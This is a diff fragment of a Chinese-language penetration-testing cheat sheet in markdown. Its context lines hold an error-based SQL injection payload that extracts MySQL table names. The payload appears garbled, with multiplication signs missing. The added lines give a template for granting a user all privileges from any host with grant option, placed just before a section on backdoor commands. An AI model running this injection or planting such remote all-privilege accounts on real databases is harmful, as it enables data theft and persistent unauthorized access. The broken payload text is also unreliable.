@@ -395,6 +395,14 @@ file_name(@@version)
 1' and (select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)
 
 ```
+-赋给用户远程权限
+```
+GRANT ALL PRIVILEGES ON *.* TO 'user'@'%' IDENTIFIED BY 'mypwd' WITH GRANT OPTION; 
+FLUSH   PRIVILEGES;
+模板：
+grant all privileges on 库名.表名 to '用户名'@'IP地址' identified by '密码' with grant option;
+flush privileges;
+```
 
 ## 命令及后门相关
 > **后门命令及常用渗透命令** 
